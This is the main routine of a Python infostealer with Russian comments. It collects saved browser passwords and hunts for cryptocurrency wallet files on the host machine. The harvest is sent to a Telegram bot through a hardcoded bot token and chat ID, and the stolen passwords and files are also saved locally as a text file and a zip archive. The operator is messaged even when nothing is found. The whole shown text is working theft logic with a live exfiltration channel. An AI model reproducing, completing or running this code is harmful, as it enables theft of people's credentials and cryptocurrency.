    TELEGRAM_TOKEN = "8030418004:AAFdKxoOHNnjcPLD-_SXCdd-nLN_lG-ZejM"
    TELEGRAM_CHAT_ID = "7556622176"

    # Включите/отключите отправку в Telegram
    ENABLE_TELEGRAM = True  # Измените на False, чтобы отключить отправку

    logger.info("Запуск программы извлечения криптовалютных данных")

    try:
        # Инициализация Telegram отправителя
        telegram_sender = None
        if ENABLE_TELEGRAM and TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
            telegram_sender = TelegramSender(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)
            logger.info("Telegram отправка включена")
        else:
            logger.info("Telegram отправка отключена")

        with CryptoDataExtractor(telegram_sender) as extractor:
            # Извлечение данных браузеров
            logger.info("Начинаем извлечение данных браузеров...")
            browser_data = extractor.get_browser_data()

            # Умный поиск криптовалютных файлов
            logger.info("Начинаем умный поиск криптовалютных файлов...")
            crypto_files = extractor.find_crypto_files()

            # Отправка в Telegram
            if telegram_sender:
                extractor.send_data_to_telegram(browser_data, crypto_files)

            # Создание локальных файлов (независимо от Telegram)
            if browser_data:
                local_passwords_file = os.path.join(os.path.dirname(__file__), 'passwords.txt')
                passwords_file = extractor.create_passwords_file(browser_data)
                if passwords_file:
                    shutil.copy2(passwords_file, local_passwords_file)
                    print(f"✅ Файл с паролями создан: {local_passwords_file}")

            if crypto_files:
                local_archive = os.path.join(os.path.dirname(__file__), 'crypto_files.zip')
                files_archive = extractor.create_files_archive(crypto_files)
                if files_archive:
                    shutil.copy2(files_archive, local_archive)
                    print(f"✅ Архив с файлами создан: {local_archive}")

                    # Статистика по уверенности
                    high_conf = len([f for f in crypto_files if f.confidence >= 8])
                    medium_conf = len([f for f in crypto_files if 5 <= f.confidence < 8])
                    print(f"🔥 Высокая уверенность: {high_conf}")
                    print(f"🟡 Средняя уверенность: {medium_conf}")

            print(f"📊 Найдено паролей: {len(browser_data)}")
            print(f"📁 Найдено крипто-файлов: {len(crypto_files)}")

            if not browser_data and not crypto_files:
                logger.info("Данные не найдены")
                print("❌ Криптовалютные данные не обнаружены")
                if telegram_sender:
                    telegram_sender.send_message("❌ Криптовалютные данные не обнаружены на данном компьютере")

    except Exception as e:
        logger.error(f"Критическая ошибка: {e}")
        print(f"❌ Произошла ошибка: {e}")
        if 'telegram_sender' in locals() and telegram_sender:
            telegram_sender.send_message(f"❌ Критическая ошибка: {str(e)}")

if __name__ == "__main__":
    main()
